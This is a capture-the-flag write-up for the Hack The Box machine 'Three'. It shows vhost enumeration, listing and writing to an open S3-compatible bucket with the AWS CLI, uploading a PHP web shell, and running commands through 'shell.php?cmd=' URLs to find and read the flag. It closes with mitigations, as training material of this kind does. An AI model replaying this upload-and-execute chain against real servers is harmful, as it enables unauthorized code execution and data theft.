# HTB Starting Point - Three

## Overview

Three is a Tier 1 Hack The Box Starting Point machine focused on virtual host enumeration, AWS S3 bucket enumeration, cloud storage misconfigurations, and Remote Code Execution (RCE).

The objective was to identify hidden subdomains, enumerate an exposed S3-compatible storage service, discover accessible bucket contents, abuse write permissions, upload a PHP file, and retrieve the flag.

This room demonstrated how an insecure cloud storage configuration can ultimately lead to code execution on a web server.

---

## Skills Learned

- Service enumeration
- Virtual host enumeration
- AWS CLI usage
- S3 bucket enumeration
- Cloud storage security
- File upload abuse
- Remote Code Execution (RCE)
- Linux command execution through web applications

---

## Tools Used

- Nmap
- Gobuster
- AWS CLI
- Curl
- Firefox

---

## Enumeration

### Service Discovery

I began by scanning the target machine to identify open ports and running services.

```bash
nmap -sV <target-ip>
```

### Results

```text
22/tcp open ssh
80/tcp open http
```

### Findings

- SSH service running on port 22.
- Web application hosted on port 80.
- The web application became the primary attack surface.

---

## Website Investigation

After browsing to the target IP address, I discovered the website domain:

```text
thetoppers.htb
```

To properly access the site, I added the hostname to my hosts file.

### Command

```bash
echo "<target-ip> thetoppers.htb" | sudo tee -a /etc/hosts
```

### Result

Successfully accessed:

```text
http://thetoppers.htb
```

---

## Virtual Host Enumeration

### Challenge Encountered

The website appeared static and did not expose any obvious functionality, login pages, or attack vectors.

### Investigation

To discover additional attack surfaces, I performed virtual host enumeration.

### Command

```bash
gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

### Results

```text
s3.thetoppers.htb
```

### Findings

A hidden subdomain was discovered:

```text
s3.thetoppers.htb
```

The name suggested the presence of an S3-compatible storage service.

---

## Configuring Access to the New Subdomain

After discovering the hidden subdomain, I added it to my hosts file.

### Command

```bash
echo "<target-ip> s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

### Verification

```bash
curl http://s3.thetoppers.htb
```

### Result

```json
{"status":"running"}
```

### Findings

The storage service was active and responding.

---

## AWS CLI Configuration

To interact with the service, I configured AWS CLI.

### Command

```bash
aws configure
```

### Configuration

```text
AWS Access Key ID: test
AWS Secret Access Key: test
Default region name: us-east-1
Default output format: json
```

### Result

AWS CLI configured successfully.

---

## Bucket Enumeration

### Command

```bash
aws s3 ls --endpoint-url http://s3.thetoppers.htb
```

### Result

```text
2026-11-09 11:04:27 thetoppers.htb
```

### Findings

An accessible bucket named:

```text
thetoppers.htb
```

was discovered.

---

## Enumerating Bucket Contents

### Command

```bash
aws s3 ls s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb
```

### Result

```text
PRE images/
.htaccess
index.php
```

### Findings

The bucket contained website files.

This suggested the bucket was being used to serve content for the web application.

---

## Testing Bucket Access

### Downloading a File

To verify permissions, I downloaded the application's PHP file.

### Command

```bash
aws s3 cp s3://thetoppers.htb/index.php . --endpoint-url http://s3.thetoppers.htb
```

### Result

```text
index.php
```

downloaded successfully.

### Findings

- Read access confirmed.
- Bucket contents could be downloaded without restrictions.

---

## Testing Write Access

### Creating a PHP Test File

### Command

```bash
nano shell.php
```

### Purpose

Created a simple PHP test file to determine whether uploaded files would be executed by the web server.

The exact file contents have been omitted from this writeup.

---

### Uploading the File

### Command

```bash
aws s3 cp shell.php s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb
```

### Result

Upload completed successfully.

### Findings

The bucket allowed file uploads.

This represented a critical security issue because uploaded files became accessible through the website.

---

## Verifying Code Execution

### URL

```text
http://thetoppers.htb/shell.php?cmd=id
```

### Result

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Findings

Remote Code Execution successfully confirmed.

### Impact

Commands were executed on the target system under the web server account:

```text
www-data
```

---

## Flag Discovery

### URL

```text
http://thetoppers.htb/shell.php?cmd=find%20/%20-name%20flag.txt%202>/dev/null
```

### Result

```text
/var/www/flag.txt
```

### Findings

The flag file was located successfully.

---

## Flag Retrieval

### URL

```text
http://thetoppers.htb/shell.php?cmd=cat%20/var/www/flag.txt
```

### Result

Flag successfully retrieved.

---

## Challenges Encountered

### Challenge 1: No Obvious Attack Surface

**Problem**

The website appeared static and did not expose any obvious functionality.

**Solution**

Performed virtual host enumeration using Gobuster.

**Lesson Learned**

Attack surfaces are not always visible from the primary website and may exist through hidden subdomains.

---

### Challenge 2: Understanding the Discovered Service

**Problem**

It was not immediately clear what `s3.thetoppers.htb` represented.

**Solution**

Investigated the service and identified it as an S3-compatible storage platform.

**Lesson Learned**

Service names can provide valuable clues during enumeration.

---

### Challenge 3: Determining Bucket Permissions

**Problem**

Discovering a bucket does not automatically reveal whether it is vulnerable.

**Solution**

Tested both read and write permissions by downloading and uploading files.

**Lesson Learned**

Always validate access controls instead of making assumptions.

---

## Key Concepts

### Virtual Host Enumeration

The process of discovering hidden websites hosted on the same server through different hostnames.

### AWS S3

Amazon Simple Storage Service (S3) is an object storage platform used to store files and application data.

### AWS CLI

A command-line tool used to interact with AWS services and S3-compatible storage platforms.

### Server-Side Code Execution

A situation where uploaded code is processed and executed by the web server rather than treated as a normal file.

### Remote Code Execution (RCE)

A vulnerability that allows attackers to execute arbitrary commands on a target system.

---

## Security Lessons

### Vulnerabilities Identified

- Exposed S3-Compatible Service
- Public Bucket Enumeration
- Excessive Bucket Permissions
- Arbitrary File Upload
- Remote Code Execution

### Risks

- Data exposure
- Website compromise
- Command execution
- Full application takeover

### Recommended Mitigations

- Restrict public S3 bucket access.
- Enforce least-privilege permissions.
- Validate uploaded files.
- Prevent execution of uploaded content.
- Regularly audit cloud storage configurations.

---

## Cybersecurity Relevance

This room is relevant to:

- Cloud Security
- AWS Security
- Security Analyst Roles
- Penetration Testing
- Web Application Security

Cloud storage misconfigurations remain one of the most common causes of security incidents and can directly lead to application compromise if not properly secured.

---

## Key Takeaways

- Enumeration should always come first.
- Hidden subdomains can reveal entirely new attack surfaces.
- Cloud storage services require proper access controls.
- Writable storage buckets can lead directly to Remote Code Execution.
- Small configuration mistakes can result in complete compromise of an application.

---

## Screenshots

1. Nmap Scan (`nmap-scan.png`)
2. Virtual Host Enumeration (`vhost-enumeration.png`)
3. S3 Service Discovery (`s3-service-discovery.png`)
4. Bucket Enumeration (`aws-bucket-enumeration.png`)
5. Bucket Contents (`bucket-contents.png`)
6. PHP File Upload (`php-file-upload.png`)
7. RCE Confirmation (`rce-confirmation.png`)
8. Flag Discovery (`flag-discovery.png`)
9. Flag Retrieval (`flag.png`)

---

## Reflection

Three demonstrated how a cloud storage misconfiguration can evolve into Remote Code Execution. The room reinforced the value of systematic enumeration and highlighted the importance of investigating hidden infrastructure instead of focusing solely on the visible web application. By identifying a hidden subdomain, enumerating the S3 service, and exploiting excessive permissions, it was possible to gain code execution and retrieve the flag.